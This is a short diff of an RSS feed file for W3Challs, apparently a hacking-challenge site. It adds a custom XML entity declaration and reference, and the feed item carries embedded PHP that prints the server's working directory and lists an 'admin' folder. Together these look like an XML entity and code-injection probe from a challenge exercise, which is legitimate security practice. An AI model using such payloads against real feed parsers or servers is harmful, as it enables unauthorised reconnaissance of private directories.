@@ -1,3 +1,6 @@
+<!DOCTYPE root [
+<!ENTITY hack "prout">
+]>
 <rss version="2.0">
 	<channel>
 		<title>W3Challs</title>
@@ -14,6 +17,7 @@
 			</title>
 			<link>http://www.w3challs.com/news/75</link>
 			<description>
+				&hack;
 				<?php 
 				echo 'cwd: '. getcwd() . "\r\n";
 				$array = scandir('admin');
